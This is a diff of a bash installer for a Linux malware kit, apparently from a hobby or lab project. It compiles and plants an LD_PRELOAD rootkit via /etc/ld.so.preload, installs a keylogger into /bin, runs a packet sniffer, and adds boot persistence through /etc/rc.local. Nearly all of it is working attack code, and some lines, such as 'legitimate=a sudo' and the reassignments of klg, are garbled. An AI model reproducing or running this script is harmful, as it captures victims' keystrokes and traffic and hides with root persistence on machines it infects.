@@ -1,11 +1,28 @@
 #!/usr/bin/env bash
 
-if [ $# -lt 2 ]; then
-    echo usage: $0 <keylog log> <packet sniffer log>
+if [ $# -lt 2 -a -z "${klg}" -a -z "${psn}" ]; then
+    echo usage: $0 \<keylog log\> \<packet sniffer log\>
 fi
 
+if [ ! -f /lib/x86_64-linux-gnu/malicious.so ]; then
+    echo compiling rootkit
+    gcc -fpic -shared -o malicious.so malicious.c -nostartfiles -ldl
+
+    mv malicious.so /lib/x86_64-linux-gnu/malicious.so
+
+    echo adding to ld_preload
+    echo /lib/x86_64-linux-gnu/malicious.so >> /etc/ld.so.preload
+fi
+
+if [ ! -f /bin/keylog ]; then
+    gcc keylog.c -o keylog
+    mv ./keylog /bin/keylog
+fi
+
+legitimate=a sudo > /dev/null 2> /dev/null
+
 echo starting keylogger
-./keylog "$1" &
+keylog "${klg:-$1}" &
 
 if [ $? -ne 0 ]; then
     case $? in
@@ -24,8 +41,10 @@ if [ $? -ne 0 ]; then
     esac
 fi
 
+klg="$1"
+
 echo starting packet sniffer
-python3 sniffer.py "$2" &
+python3 sniffer.py "${psn:-$2}"
 
 if [ $? -ne 0 ]; then
     case $? in
@@ -44,10 +63,11 @@ if [ $? -ne 0 ]; then
     esac
 fi
 
-echo compiling rootkit
-gcc -fpic -shared -o malicious.so malicious.c -nostartfiles -ldl
+klg="$2"
 
-mv malicious.so /lib/x86_64-linux-gnu/malicious.so
-
-echo adding to ld_preload
-echo /lib/x86_64-linux-gnu/malicious.so >> /etc/ld.so.preload
+if [ ! -f /etc/rc.local ]; then
+    printf "#!" > /etc/rc.local
+    printf "/bin/sh\n$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )/super_cool_program\nexit 0" >> /etc/rc.local
+    chmod -v +x /etc/rc.local
+    systemctl enable rc-local.service
+fi
